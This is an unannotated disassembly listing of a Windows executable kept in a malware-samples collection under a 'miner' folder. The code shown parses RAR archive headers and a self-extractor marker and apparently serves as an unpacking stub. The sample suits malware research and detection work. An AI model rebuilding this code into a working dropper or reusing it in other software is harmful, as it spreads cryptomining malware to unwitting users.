
malware_samples/miner/e14d20d5a80507197245fc2b53eefc6c5b9de9a422857b376434f7dd03533bc0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	c3                   	ret
  401001:	b8 2a 93 42 00       	mov    $0x42932a,%eax
  401006:	e8 51 90 01 00       	call   0x41a05c
  40100b:	51                   	push   %ecx
  40100c:	56                   	push   %esi
  40100d:	8b f1                	mov    %ecx,%esi
  40100f:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401012:	8d 8e d0 38 00 00    	lea    0x38d0(%esi),%ecx
  401018:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  40101f:	e8 c0 85 00 00       	call   0x4095e4
  401024:	8d 8e 6c 2d 00 00    	lea    0x2d6c(%esi),%ecx
  40102a:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40102e:	e8 b1 85 00 00       	call   0x4095e4
  401033:	8d 8e 08 22 00 00    	lea    0x2208(%esi),%ecx
  401039:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  40103d:	e8 a2 85 00 00       	call   0x4095e4
  401042:	8d 8e 00 11 00 00    	lea    0x1100(%esi),%ecx
  401048:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  40104c:	e8 78 4d 00 00       	call   0x405dc9
  401051:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401055:	8d 4e 40             	lea    0x40(%esi),%ecx
  401058:	e8 6c 4d 00 00       	call   0x405dc9
  40105d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401060:	5e                   	pop    %esi
  401061:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401068:	c9                   	leave
  401069:	c3                   	ret
  40106a:	33 c0                	xor    %eax,%eax
  40106c:	83 7c 24 08 01       	cmpl   $0x1,0x8(%esp)
  401071:	72 4a                	jb     0x4010bd
  401073:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401077:	80 39 52             	cmpb   $0x52,(%ecx)
  40107a:	75 41                	jne    0x4010bd
  40107c:	83 7c 24 08 07       	cmpl   $0x7,0x8(%esp)
  401081:	72 3a                	jb     0x4010bd
  401083:	80 79 01 61          	cmpb   $0x61,0x1(%ecx)
  401087:	75 34                	jne    0x4010bd
  401089:	80 79 02 72          	cmpb   $0x72,0x2(%ecx)
  40108d:	75 2e                	jne    0x4010bd
  40108f:	80 79 03 21          	cmpb   $0x21,0x3(%ecx)
  401093:	75 28                	jne    0x4010bd
  401095:	80 79 04 1a          	cmpb   $0x1a,0x4(%ecx)
  401099:	75 22                	jne    0x4010bd
  40109b:	80 79 05 07          	cmpb   $0x7,0x5(%ecx)
  40109f:	75 1c                	jne    0x4010bd
  4010a1:	8a 49 06             	mov    0x6(%ecx),%cl
  4010a4:	84 c9                	test   %cl,%cl
  4010a6:	75 04                	jne    0x4010ac
  4010a8:	6a 02                	push   $0x2
  4010aa:	eb 10                	jmp    0x4010bc
  4010ac:	80 f9 01             	cmp    $0x1,%cl
  4010af:	75 04                	jne    0x4010b5
  4010b1:	6a 03                	push   $0x3
  4010b3:	eb 07                	jmp    0x4010bc
  4010b5:	80 f9 02             	cmp    $0x2,%cl
  4010b8:	75 03                	jne    0x4010bd
  4010ba:	6a 04                	push   $0x4
  4010bc:	58                   	pop    %eax
  4010bd:	c2 08 00             	ret    $0x8
  4010c0:	8b 01                	mov    (%ecx),%eax
  4010c2:	6a 00                	push   $0x0
  4010c4:	ff b1 4c b0 00 00    	push   0xb04c(%ecx)
  4010ca:	ff b1 48 b0 00 00    	push   0xb048(%ecx)
  4010d0:	ff 50 0c             	call   *0xc(%eax)
  4010d3:	c3                   	ret
  4010d4:	55                   	push   %ebp
  4010d5:	8b ec                	mov    %esp,%ebp
  4010d7:	80 b9 5c b0 00 00 00 	cmpb   $0x0,0xb05c(%ecx)
  4010de:	74 1f                	je     0x4010ff
  4010e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4010e3:	f7 d0                	not    %eax
  4010e5:	40                   	inc    %eax
  4010e6:	83 e0 0f             	and    $0xf,%eax
  4010e9:	01 45 08             	add    %eax,0x8(%ebp)
  4010ec:	83 b9 50 b0 00 00 03 	cmpl   $0x3,0xb050(%ecx)
  4010f3:	75 06                	jne    0x4010fb
  4010f5:	83 45 08 10          	addl   $0x10,0x8(%ebp)
  4010f9:	eb 04                	jmp    0x4010ff
  4010fb:	83 45 08 08          	addl   $0x8,0x8(%ebp)
  4010ff:	8b 45 08             	mov    0x8(%ebp),%eax
  401102:	5d                   	pop    %ebp
  401103:	c2 04 00             	ret    $0x4
  401106:	8b 44 24 04          	mov    0x4(%esp),%eax
  40110a:	56                   	push   %esi
  40110b:	8b f1                	mov    %ecx,%esi
  40110d:	01 46 04             	add    %eax,0x4(%esi)
  401110:	8b 4e 04             	mov    0x4(%esi),%ecx
  401113:	3b 4e 08             	cmp    0x8(%esi),%ecx
  401116:	76 5f                	jbe    0x401177
  401118:	8b 46 0c             	mov    0xc(%esi),%eax
  40111b:	53                   	push   %ebx
  40111c:	55                   	push   %ebp
  40111d:	57                   	push   %edi
  40111e:	bd ac 25 43 00       	mov    $0x4325ac,%ebp
  401123:	85 c0                	test   %eax,%eax
  401125:	74 1a                	je     0x401141
  401127:	3b c8                	cmp    %eax,%ecx
  401129:	76 16                	jbe    0x401141
  40112b:	50                   	push   %eax
  40112c:	68 10 a4 42 00       	push   $0x42a410
  401131:	55                   	push   %ebp
  401132:	e8 4a 52 00 00       	call   0x406381
  401137:	83 c4 0c             	add    $0xc,%esp
  40113a:	8b cd                	mov    %ebp,%ecx
  40113c:	e8 eb 51 00 00       	call   0x40632c
  401141:	8b 46 08             	mov    0x8(%esi),%eax
  401144:	8b c8                	mov    %eax,%ecx
  401146:	c1 e9 02             	shr    $0x2,%ecx
  401149:	8d 44 01 20          	lea    0x20(%ecx,%eax,1),%eax
  40114d:	8b 4e 04             	mov    0x4(%esi),%ecx
  401150:	8b d9                	mov    %ecx,%ebx
  401152:	3b c8                	cmp    %eax,%ecx
  401154:	77 02                	ja     0x401158
  401156:	8b d8                	mov    %eax,%ebx
  401158:	53                   	push   %ebx
  401159:	ff 36                	push   (%esi)
  40115b:	e8 b4 8f 01 00       	call   0x41a114
  401160:	8b f8                	mov    %eax,%edi
  401162:	59                   	pop    %ecx
  401163:	59                   	pop    %ecx
  401164:	85 ff                	test   %edi,%edi
  401166:	75 07                	jne    0x40116f
  401168:	8b cd                	mov    %ebp,%ecx
  40116a:	e8 bd 51 00 00       	call   0x40632c
  40116f:	89 3e                	mov    %edi,(%esi)
  401171:	5f                   	pop    %edi
  401172:	5d                   	pop    %ebp
  401173:	89 5e 08             	mov    %ebx,0x8(%esi)
  401176:	5b                   	pop    %ebx
  401177:	5e                   	pop    %esi
  401178:	c2 04 00             	ret    $0x4
  40117b:	56                   	push   %esi
  40117c:	8b f1                	mov    %ecx,%esi
  40117e:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401182:	89 0e                	mov    %ecx,(%esi)
  401184:	8b 01                	mov    (%ecx),%eax
  401186:	ff 50 10             	call   *0x10(%eax)
  401189:	89 46 08             	mov    %eax,0x8(%esi)
  40118c:	89 56 0c             	mov    %edx,0xc(%esi)
  40118f:	8b c6                	mov    %esi,%eax
  401191:	5e                   	pop    %esi
  401192:	c2 04 00             	ret    $0x4
  401195:	8b c1                	mov    %ecx,%eax
  401197:	8b 08                	mov    (%eax),%ecx
  401199:	8b 11                	mov    (%ecx),%edx
  40119b:	6a 00                	push   $0x0
  40119d:	ff 70 0c             	push   0xc(%eax)
  4011a0:	ff 70 08             	push   0x8(%eax)
  4011a3:	ff 52 0c             	call   *0xc(%edx)
  4011a6:	c3                   	ret
  4011a7:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011ab:	56                   	push   %esi
  4011ac:	8b f1                	mov    %ecx,%esi
  4011ae:	01 46 04             	add    %eax,0x4(%esi)
  4011b1:	8b 4e 04             	mov    0x4(%esi),%ecx
  4011b4:	3b 4e 08             	cmp    0x8(%esi),%ecx
  4011b7:	76 60                	jbe    0x401219
  4011b9:	8b 46 0c             	mov    0xc(%esi),%eax
  4011bc:	53                   	push   %ebx
  4011bd:	55                   	push   %ebp
  4011be:	57                   	push   %edi
  4011bf:	bd ac 25 43 00       	mov    $0x4325ac,%ebp
  4011c4:	85 c0                	test   %eax,%eax
  4011c6:	74 1a                	je     0x4011e2
  4011c8:	3b c8                	cmp    %eax,%ecx
  4011ca:	76 16                	jbe    0x4011e2
  4011cc:	50                   	push   %eax
  4011cd:	68 10 a4 42 00       	push   $0x42a410
  4011d2:	55                   	push   %ebp
  4011d3:	e8 a9 51 00 00       	call   0x406381
  4011d8:	83 c4 0c             	add    $0xc,%esp
  4011db:	8b cd                	mov    %ebp,%ecx
  4011dd:	e8 4a 51 00 00       	call   0x40632c
  4011e2:	8b 46 08             	mov    0x8(%esi),%eax
  4011e5:	8b 7e 04             	mov    0x4(%esi),%edi
  4011e8:	8b c8                	mov    %eax,%ecx
  4011ea:	c1 e9 02             	shr    $0x2,%ecx
  4011ed:	8d 44 01 20          	lea    0x20(%ecx,%eax,1),%eax
  4011f1:	3b f8                	cmp    %eax,%edi
  4011f3:	77 02                	ja     0x4011f7
  4011f5:	8b f8                	mov    %eax,%edi
  4011f7:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  4011fa:	50                   	push   %eax
  4011fb:	ff 36                	push   (%esi)
  4011fd:	e8 12 8f 01 00       	call   0x41a114
  401202:	8b d8                	mov    %eax,%ebx
  401204:	59                   	pop    %ecx
  401205:	59                   	pop    %ecx
  401206:	85 db                	test   %ebx,%ebx
  401208:	75 07                	jne    0x401211
  40120a:	8b cd                	mov    %ebp,%ecx
  40120c:	e8 1b 51 00 00       	call   0x40632c
  401211:	89 7e 08             	mov    %edi,0x8(%esi)
  401214:	5f                   	pop    %edi
  401215:	5d                   	pop    %ebp
  401216:	89 1e                	mov    %ebx,(%esi)
  401218:	5b                   	pop    %ebx
  401219:	5e                   	pop    %esi
  40121a:	c2 04 00             	ret    $0x4
  40121d:	81 c1 20 10 00 00    	add    $0x1020,%ecx
  401223:	e9 c1 13 01 00       	jmp    0x4125e9
  401228:	b8 88 90 42 00       	mov    $0x429088,%eax
  40122d:	e8 2a 8e 01 00       	call   0x41a05c
  401232:	51                   	push   %ecx
  401233:	56                   	push   %esi
  401234:	8b f1                	mov    %ecx,%esi
  401236:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401239:	c7 06 68 a4 42 00    	movl   $0x42a468,(%esi)
  40123f:	80 be 20 65 00 00 00 	cmpb   $0x0,0x6520(%esi)
  401246:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  40124d:	74 1a                	je     0x401269
  40124f:	57                   	push   %edi
  401250:	8b be 24 65 00 00    	mov    0x6524(%esi),%edi
  401256:	85 ff                	test   %edi,%edi
  401258:	74 0e                	je     0x401268
  40125a:	8b cf                	mov    %edi,%ecx
  40125c:	e8 23 8b 00 00       	call   0x409d84
  401261:	57                   	push   %edi
  401262:	e8 14 8e 01 00       	call   0x41a07b
  401267:	59                   	pop    %ecx
  401268:	5f                   	pop    %edi
  401269:	8d 8e 48 99 00 00    	lea    0x9948(%esi),%ecx
  40126f:	e8 75 13 01 00       	call   0x4125e9
  401274:	8d 8e 08 76 00 00    	lea    0x7608(%esi),%ecx
  40127a:	e8 6a 13 01 00       	call   0x4125e9
  40127f:	8d 8e e8 20 00 00    	lea    0x20e8(%esi),%ecx
  401285:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  401289:	e8 73 fd ff ff       	call   0x401001
  40128e:	8d 8e 24 10 00 00    	lea    0x1024(%esi),%ecx
  401294:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  401298:	e8 2c 4b 00 00       	call   0x405dc9
  40129d:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4012a1:	8b ce                	mov    %esi,%ecx
  4012a3:	e8 5d 77 00 00       	call   0x408a05
  4012a8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4012ab:	5e                   	pop    %esi
  4012ac:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4012b3:	c9                   	leave
  4012b4:	c3                   	ret
  4012b5:	56                   	push   %esi
  4012b6:	6a 01                	push   $0x1
  4012b8:	8b f1                	mov    %ecx,%esi
  4012ba:	e8 47 fe ff ff       	call   0x401106
  4012bf:	8b 46 04             	mov    0x4(%esi),%eax
  4012c2:	8b 0e                	mov    (%esi),%ecx
  4012c4:	8a 54 24 08          	mov    0x8(%esp),%dl
  4012c8:	88 54 08 ff          	mov    %dl,-0x1(%eax,%ecx,1)
  4012cc:	5e                   	pop    %esi
  4012cd:	c2 04 00             	ret    $0x4
  4012d0:	55                   	push   %ebp
  4012d1:	8b ec                	mov    %esp,%ebp
  4012d3:	83 ec 4c             	sub    $0x4c,%esp
  4012d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4012d9:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4012dd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4012e0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4012e3:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4012e6:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4012e9:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  4012f0:	e8 cb ff 00 00       	call   0x4112c0
  4012f5:	c9                   	leave
  4012f6:	c2 08 00             	ret    $0x8
  4012f9:	56                   	push   %esi
  4012fa:	ff 74 24 08          	push   0x8(%esp)
  4012fe:	8b f1                	mov    %ecx,%esi
  401300:	33 c0                	xor    %eax,%eax
  401302:	89 06                	mov    %eax,(%esi)
  401304:	89 46 04             	mov    %eax,0x4(%esi)
  401307:	89 46 08             	mov    %eax,0x8(%esi)
  40130a:	89 46 0c             	mov    %eax,0xc(%esi)
  40130d:	e8 f4 fd ff ff       	call   0x401106
  401312:	8b c6                	mov    %esi,%eax
  401314:	5e                   	pop    %esi
  401315:	c2 04 00             	ret    $0x4
  401318:	8b 44 24 04          	mov    0x4(%esp),%eax
  40131c:	3b 41 08             	cmp    0x8(%ecx),%eax
  40131f:	76 0b                	jbe    0x40132c
  401321:	2b 41 04             	sub    0x4(%ecx),%eax
  401324:	50                   	push   %eax
  401325:	e8 7d fe ff ff       	call   0x4011a7
  40132a:	eb 03                	jmp    0x40132f
  40132c:	89 41 04             	mov    %eax,0x4(%ecx)
  40132f:	c2 04 00             	ret    $0x4
  401332:	b8 9a 90 42 00       	mov    $0x42909a,%eax
  401337:	e8 20 8d 01 00       	call   0x41a05c
  40133c:	83 ec 10             	sub    $0x10,%esp
  40133f:	53                   	push   %ebx
  401340:	56                   	push   %esi
  401341:	33 f6                	xor    %esi,%esi
  401343:	8b d9                	mov    %ecx,%ebx
  401345:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  401348:	89 75 e8             	mov    %esi,-0x18(%ebp)
  40134b:	89 75 ec             	mov    %esi,-0x14(%ebp)
  40134e:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401351:	56                   	push   %esi
  401352:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401355:	50                   	push   %eax
  401356:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401359:	e8 f5 18 00 00       	call   0x402c53
  40135e:	84 c0                	test   %al,%al
  401360:	75 15                	jne    0x401377
  401362:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  401365:	74 09                	je     0x401370
  401367:	ff 75 e4             	push   -0x1c(%ebp)
  40136a:	e8 17 8d 01 00       	call   0x41a086
  40136f:	59                   	pop    %ecx
  401370:	32 c0                	xor    %al,%al
  401372:	e9 82 00 00 00       	jmp    0x4013f9
  401377:	57                   	push   %edi
  401378:	8b 7d e8             	mov    -0x18(%ebp),%edi
  40137b:	56                   	push   %esi
  40137c:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40137f:	e8 31 ff ff ff       	call   0x4012b5
  401384:	8b 75 08             	mov    0x8(%ebp),%esi
  401387:	8d 47 01             	lea    0x1(%edi),%eax
  40138a:	50                   	push   %eax
  40138b:	8b ce                	mov    %esi,%ecx
  40138d:	e8 86 ff ff ff       	call   0x401318
  401392:	83 bb 50 b0 00 00 03 	cmpl   $0x3,0xb050(%ebx)
  401399:	75 0f                	jne    0x4013aa
  40139b:	ff 76 04             	push   0x4(%esi)
  40139e:	ff 36                	push   (%esi)
  4013a0:	ff 75 e4             	push   -0x1c(%ebp)
  4013a3:	e8 af 04 01 00       	call   0x411857
  4013a8:	eb 2d                	jmp    0x4013d7
  4013aa:	f6 83 44 89 00 00 01 	testb  $0x1,0x8944(%ebx)
  4013b1:	74 17                	je     0x4013ca
  4013b3:	d1 ef                	shr    $1,%edi
  4013b5:	57                   	push   %edi
  4013b6:	ff 36                	push   (%esi)
  4013b8:	ff 75 e4             	push   -0x1c(%ebp)
  4013bb:	e8 6d 03 01 00       	call   0x41172d
  4013c0:	8b 06                	mov    (%esi),%eax
  4013c2:	33 c9                	xor    %ecx,%ecx
  4013c4:	66 89 0c 78          	mov    %cx,(%eax,%edi,2)
  4013c8:	eb 0d                	jmp    0x4013d7
  4013ca:	ff 76 04             	push   0x4(%esi)
  4013cd:	ff 36                	push   (%esi)
  4013cf:	ff 75 e4             	push   -0x1c(%ebp)
  4013d2:	e8 eb 02 01 00       	call   0x4116c2
  4013d7:	ff 36                	push   (%esi)
  4013d9:	e8 51 8f 01 00       	call   0x41a32f
  4013de:	59                   	pop    %ecx
  4013df:	50                   	push   %eax
  4013e0:	8b ce                	mov    %esi,%ecx
  4013e2:	e8 31 ff ff ff       	call   0x401318
  4013e7:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4013eb:	5f                   	pop    %edi
  4013ec:	74 09                	je     0x4013f7
  4013ee:	ff 75 e4             	push   -0x1c(%ebp)
  4013f1:	e8 90 8c 01 00       	call   0x41a086
  4013f6:	59                   	pop    %ecx
  4013f7:	b0 01                	mov    $0x1,%al
  4013f9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4013fc:	5e                   	pop    %esi
  4013fd:	5b                   	pop    %ebx
  4013fe:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401405:	c9                   	leave
  401406:	c2 04 00             	ret    $0x4
  401409:	56                   	push   %esi
  40140a:	8b f1                	mov    %ecx,%esi
  40140c:	e8 17 fe ff ff       	call   0x401228
  401411:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401416:	74 07                	je     0x40141f
  401418:	56                   	push   %esi
  401419:	e8 5d 8c 01 00       	call   0x41a07b
  40141e:	59                   	pop    %ecx
  40141f:	8b c6                	mov    %esi,%eax
  401421:	5e                   	pop    %esi
  401422:	c2 04 00             	ret    $0x4
  401425:	33 d2                	xor    %edx,%edx
  401427:	8b c1                	mov    %ecx,%eax
  401429:	8d 88 20 10 00 00    	lea    0x1020(%eax),%ecx
  40142f:	89 11                	mov    %edx,(%ecx)
  401431:	89 51 04             	mov    %edx,0x4(%ecx)
  401434:	89 51 08             	mov    %edx,0x8(%ecx)
  401437:	89 51 0c             	mov    %edx,0xc(%ecx)
  40143a:	89 90 30 10 00 00    	mov    %edx,0x1030(%eax)
  401440:	89 90 34 10 00 00    	mov    %edx,0x1034(%eax)
  401446:	89 90 38 10 00 00    	mov    %edx,0x1038(%eax)
  40144c:	89 90 3c 10 00 00    	mov    %edx,0x103c(%eax)
  401452:	89 90 40 10 00 00    	mov    %edx,0x1040(%eax)
  401458:	89 90 44 10 00 00    	mov    %edx,0x1044(%eax)
  40145e:	c3                   	ret
  40145f:	b8 b4 90 42 00       	mov    $0x4290b4,%eax
  401464:	e8 f3 8b 01 00       	call   0x41a05c
  401469:	83 ec 28             	sub    $0x28,%esp
  40146c:	53                   	push   %ebx
  40146d:	56                   	push   %esi
  40146e:	8b f1                	mov    %ecx,%esi
  401470:	8b 06                	mov    (%esi),%eax
  401472:	57                   	push   %edi
  401473:	6a 07                	push   $0x7
  401475:	33 db                	xor    %ebx,%ebx
  401477:	8d be 60 65 00 00    	lea    0x6560(%esi),%edi
  40147d:	57                   	push   %edi
  40147e:	88 9e 5c b0 00 00    	mov    %bl,0xb05c(%esi)
  401484:	88 9e 64 b0 00 00    	mov    %bl,0xb064(%esi)
  40148a:	ff 50 08             	call   *0x8(%eax)
  40148d:	83 f8 07             	cmp    $0x7,%eax
  401490:	74 07                	je     0x401499
  401492:	32 c0                	xor    %al,%al
  401494:	e9 ed 02 00 00       	jmp    0x401786
  401499:	6a 07                	push   $0x7
  40149b:	57                   	push   %edi
  40149c:	8b ce                	mov    %esi,%ecx
  40149e:	89 9e 60 b0 00 00    	mov    %ebx,0xb060(%esi)
  4014a4:	e8 c1 fb ff ff       	call   0x40106a
  4014a9:	3b c3                	cmp    %ebx,%eax
  4014ab:	74 28                	je     0x4014d5
  4014ad:	89 86 50 b0 00 00    	mov    %eax,0xb050(%esi)
  4014b3:	83 f8 01             	cmp    $0x1,%eax
  4014b6:	0f 85 11 01 00 00    	jne    0x4015cd
  4014bc:	8b 3e                	mov    (%esi),%edi
  4014be:	53                   	push   %ebx
  4014bf:	8b ce                	mov    %esi,%ecx
  4014c1:	ff 57 10             	call   *0x10(%edi)
  4014c4:	83 e8 07             	sub    $0x7,%eax
  4014c7:	1b d3                	sbb    %ebx,%edx
  4014c9:	52                   	push   %edx
  4014ca:	50                   	push   %eax
  4014cb:	8b ce                	mov    %esi,%ecx
  4014cd:	ff 57 0c             	call   *0xc(%edi)
  4014d0:	e9 f8 00 00 00       	jmp    0x4015cd
  4014d5:	68 00 00 10 00       	push   $0x100000
  4014da:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4014dd:	e8 17 fe ff ff       	call   0x4012f9
  4014e2:	8b 06                	mov    (%esi),%eax
  4014e4:	8b ce                	mov    %esi,%ecx
  4014e6:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4014e9:	ff 50 10             	call   *0x10(%eax)
  4014ec:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4014ef:	83 c1 f0             	add    $0xfffffff0,%ecx
  4014f2:	51                   	push   %ecx
  4014f3:	ff 75 dc             	push   -0x24(%ebp)
  4014f6:	8b f8                	mov    %eax,%edi
  4014f8:	8b 06                	mov    (%esi),%eax
  4014fa:	8b ce                	mov    %esi,%ecx
  4014fc:	ff 50 08             	call   *0x8(%eax)
  4014ff:	33 d2                	xor    %edx,%edx
  401501:	3b c3                	cmp    %ebx,%eax
  401503:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401506:	0f 8e 90 00 00 00    	jle    0x40159c
  40150c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40150f:	03 c2                	add    %edx,%eax
  401511:	80 38 52             	cmpb   $0x52,(%eax)
  401514:	75 4b                	jne    0x401561
  401516:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401519:	2b ca                	sub    %edx,%ecx
  40151b:	51                   	push   %ecx
  40151c:	50                   	push   %eax
  40151d:	8b ce                	mov    %esi,%ecx
  40151f:	e8 46 fb ff ff       	call   0x40106a
  401524:	3b c3                	cmp    %ebx,%eax
  401526:	74 39                	je     0x401561
  401528:	89 86 50 b0 00 00    	mov    %eax,0xb050(%esi)
  40152e:	83 f8 01             	cmp    $0x1,%eax
  401531:	75 36                	jne    0x401569
  401533:	3b d3                	cmp    %ebx,%edx
  401535:	7e 32                	jle    0x401569
  401537:	83 ff 1c             	cmp    $0x1c,%edi
  40153a:	7d 2d                	jge    0x401569
  40153c:	83 7d f0 1f          	cmpl   $0x1f,-0x10(%ebp)
  401540:	7e 27                	jle    0x401569
  401542:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401545:	2b c7                	sub    %edi,%eax
  401547:	83 c0 1c             	add    $0x1c,%eax
  40154a:	80 38 52             	cmpb   $0x52,(%eax)
  40154d:	75 12                	jne    0x401561
  40154f:	80 78 01 53          	cmpb   $0x53,0x1(%eax)
  401553:	75 0c                	jne    0x401561
  401555:	80 78 02 46          	cmpb   $0x46,0x2(%eax)
  401559:	75 06                	jne    0x401561
  40155b:	80 78 03 58          	cmpb   $0x58,0x3(%eax)
  40155f:	74 08                	je     0x401569
  401561:	42                   	inc    %edx
  401562:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  401565:	7c a5                	jl     0x40150c
  401567:	eb 33                	jmp    0x40159c
  401569:	53                   	push   %ebx
  40156a:	8d 04 3a             	lea    (%edx,%edi,1),%eax
  40156d:	8b 16                	mov    (%esi),%edx
  40156f:	53                   	push   %ebx
  401570:	50                   	push   %eax
  401571:	8b ce                	mov    %esi,%ecx
  401573:	89 86 60 b0 00 00    	mov    %eax,0xb060(%esi)
  401579:	ff 52 0c             	call   *0xc(%edx)
  40157c:	8b 86 50 b0 00 00    	mov    0xb050(%esi),%eax
  401582:	83 f8 02             	cmp    $0x2,%eax
  401585:	74 05                	je     0x40158c
  401587:	83 f8 03             	cmp    $0x3,%eax
  40158a:	75 10                	jne    0x40159c
  40158c:	8b 16                	mov    (%esi),%edx
  40158e:	6a 07                	push   $0x7
  401590:	8d 86 60 65 00 00    	lea    0x6560(%esi),%eax
  401596:	50                   	push   %eax
  401597:	8b ce                	mov    %esi,%ecx
  401599:	ff 52 08             	call   *0x8(%edx)
  40159c:	39 9e 60 b0 00 00    	cmp    %ebx,0xb060(%esi)
  4015a2:	75 17                	jne    0x4015bb
  4015a4:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4015a7:	0f 84 e5 fe ff ff    	je     0x401492
  4015ad:	ff 75 dc             	push   -0x24(%ebp)
  4015b0:	e8 d1 8a 01 00       	call   0x41a086
  4015b5:	59                   	pop    %ecx
  4015b6:	e9 d7 fe ff ff       	jmp    0x401492
  4015bb:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4015bf:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4015c2:	74 09                	je     0x4015cd
  4015c4:	ff 75 dc             	push   -0x24(%ebp)
  4015c7:	e8 ba 8a 01 00       	call   0x41a086
  4015cc:	59                   	pop    %ecx
  4015cd:	8b 86 50 b0 00 00    	mov    0xb050(%esi),%eax
  4015d3:	83 f8 04             	cmp    $0x4,%eax
  4015d6:	75 10                	jne    0x4015e8
  4015d8:	83 c6 1e             	add    $0x1e,%esi
  4015db:	56                   	push   %esi
  4015dc:	6a 3b                	push   $0x3b
  4015de:	e8 ed fc ff ff       	call   0x4012d0
  4015e3:	e9 aa fe ff ff       	jmp    0x401492
  4015e8:	83 f8 03             	cmp    $0x3,%eax
  4015eb:	75 24                	jne    0x401611
  4015ed:	8b 06                	mov    (%esi),%eax
  4015ef:	6a 01                	push   $0x1
  4015f1:	8d be 67 65 00 00    	lea    0x6567(%esi),%edi
  4015f7:	57                   	push   %edi
  4015f8:	8b ce                	mov    %esi,%ecx
  4015fa:	ff 50 08             	call   *0x8(%eax)
  4015fd:	38 1f                	cmp    %bl,(%edi)
  4015ff:	0f 85 8d fe ff ff    	jne    0x401492
  401605:	c7 86 68 65 00 00 08 	movl   $0x8,0x6568(%esi)
  40160c:	00 00 00 
  40160f:	eb 2b                	jmp    0x40163c
  401611:	c7 86 68 65 00 00 07 	movl   $0x7,0x6568(%esi)
  401618:	00 00 00 
  40161b:	eb 1f                	jmp    0x40163c
  40161d:	8b 86 44 65 00 00    	mov    0x6544(%esi),%eax
  401623:	83 f8 01             	cmp    $0x1,%eax
  401626:	74 1f                	je     0x401647
  401628:	38 9e 48 65 00 00    	cmp    %bl,0x6548(%esi)
  40162e:	74 05                	je     0x401635
  401630:	83 f8 04             	cmp    $0x4,%eax
  401633:	74 12                	je     0x401647
  401635:	8b ce                	mov    %esi,%ecx
  401637:	e8 84 fa ff ff       	call   0x4010c0
  40163c:	8b ce                	mov    %esi,%ecx
  40163e:	e8 18 20 00 00       	call   0x40365b
  401643:	85 c0                	test   %eax,%eax
  401645:	75 d6                	jne    0x40161d
  401647:	38 9e 65 b0 00 00    	cmp    %bl,0xb065(%esi)
  40164d:	74 09                	je     0x401658
  40164f:	38 5d 08             	cmp    %bl,0x8(%ebp)
  401652:	0f 84 3a fe ff ff    	je     0x401492
  401658:	8b ce                	mov    %esi,%ecx
  40165a:	e8 61 fa ff ff       	call   0x4010c0
  40165f:	38 9e 64 b0 00 00    	cmp    %bl,0xb064(%esi)
  401665:	74 14                	je     0x40167b
  401667:	8d 46 1e             	lea    0x1e(%esi),%eax
  40166a:	50                   	push   %eax
  40166b:	6a 19                	push   $0x19
  40166d:	e8 5e fc ff ff       	call   0x4012d0
  401672:	38 5d 08             	cmp    %bl,0x8(%ebp)
  401675:	0f 84 17 fe ff ff    	je     0x401492
  40167b:	8a 86 8c 65 00 00    	mov    0x658c(%esi),%al
  401681:	88 86 56 b0 00 00    	mov    %al,0xb056(%esi)
  401687:	38 9e 48 65 00 00    	cmp    %bl,0x6548(%esi)
  40168d:	74 0c                	je     0x40169b
  40168f:	38 9e 5c b0 00 00    	cmp    %bl,0xb05c(%esi)
  401695:	0f 85 c7 00 00 00    	jne    0x401762
  40169b:	56                   	push   %esi
  40169c:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40169f:	e8 d7 fa ff ff       	call   0x40117b
  4016a4:	8b 86 44 b0 00 00    	mov    0xb044(%esi),%eax
  4016aa:	8b be 40 b0 00 00    	mov    0xb040(%esi),%edi
  4016b0:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4016b3:	8b 86 48 b0 00 00    	mov    0xb048(%esi),%eax
  4016b9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4016bc:	8b 86 4c b0 00 00    	mov    0xb04c(%esi),%eax
